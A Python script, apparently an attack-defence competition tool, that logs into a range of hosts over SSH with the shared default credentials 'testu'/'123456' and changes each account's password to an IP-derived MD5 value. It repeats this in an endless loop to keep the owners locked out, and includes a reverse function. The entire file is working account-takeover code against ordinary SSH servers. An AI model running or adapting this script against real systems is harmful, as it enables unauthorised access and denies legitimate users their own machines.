import paramiko
import multiprocessing
#import asyncio
import hashlib
import time

class SSH:

    def __init__(self, host, port, user, passwd):
        self.host = host
        self.port = int(port)
        self.user = user
        self.passwd = passwd
        self.ssh = None

    def startup(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, self.port, self.user, self.passwd)
            t = paramiko.Transport((self.host, self.port))
            t.connect(username=self.user, password=self.passwd)
            self.ssh = ssh
            # print("[+] Connect successfully")
            return True
        except BaseException as e:
            # print("[-] Connect ERROR!! {}".format(e))
            return False

    def command_exec(self, command):
        try:
            std_in, std_out, std_err = self.ssh.exec_command(command)
            out = std_out.read()
            err = std_err.read()
            if out != b'':
                print(out.decode().rstrip("\n"))
                return out.decode().rstrip("\n")
            if err != b'':
                print(err.decode().rstrip("\n"))
        except BaseException as e:
            print("[-] Could not exec command! {}".format(e))
        return 0

    def change_passwd(self, ip, passwd, new_password):
        try:
            command = "passwd %s" %(self.user)
            stdin, stdout, stderr = self.ssh.exec_command(command)
            # stdin.write(new_password + '\n' + new_password + '\n')
            stdin.write(passwd + '\n' + new_password + '\n' + new_password + '\n')
            out, err = stdout.read(), stderr.read()
            successful = 'password updated successfully'
            if successful in str(err):
                print(ip + " successfully!")
                self.ssh.close()
            else:
                # print("[-] change {} passwd failed! {}".format(ip, str(err)))
                self.ssh.close()
        except BaseException as e:
            print("[-] Could not exec command! {}".format(e))
        return 0


def md5(s):
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


def gen_passwd(ip):
    passwd = md5("jspi" + str(ip) + "nealwe_NEALWE")
    return passwd

def ip_list(x):
    ipList = []
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m, n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    return ipList


def change_passwd(user, ip, port, passwd):
    new_passwd = gen_passwd(ip)
    try:
        a = SSH(ip, port, user, passwd)
        if a.startup():
            a.change_passwd(ip, passwd, new_passwd)
            # a.command_exec("killall -u {}".format(user))
        else:
            # print("[-] change {} passwd failed! ".format(ip))
            pass
    except BaseException as e:
        # print("[-] change {} passwd failed! {}".format(ip, e))
        pass
    return 0


def change_passwd_back(user, ip, port, passwd):
    new_passwd = gen_passwd(ip)
    try:
        a = SSH(ip, port, user, new_passwd)
        if a.startup():
            a.change_passwd(ip, new_passwd, passwd)
            # a.command_exec("killall -u {}".format(user))
        else:
            # print("[-] change {} passwd failed! ".format(ip))
            pass
    except BaseException as e:
        # print("[-] change {} passwd failed! {}".format(ip, e))
        pass
    return 0




ips = ip_list("4.4.1-83.101") + ip_list("4.4.1-83.100")
ports = ["22"]
user = "testu"
passwd = "123456"

while True:
    for port in ports:
        for ip in ips:
            t = multiprocessing.Process(target=change_passwd, args=(user, ip, port, passwd,))
            t.start()
        t.join()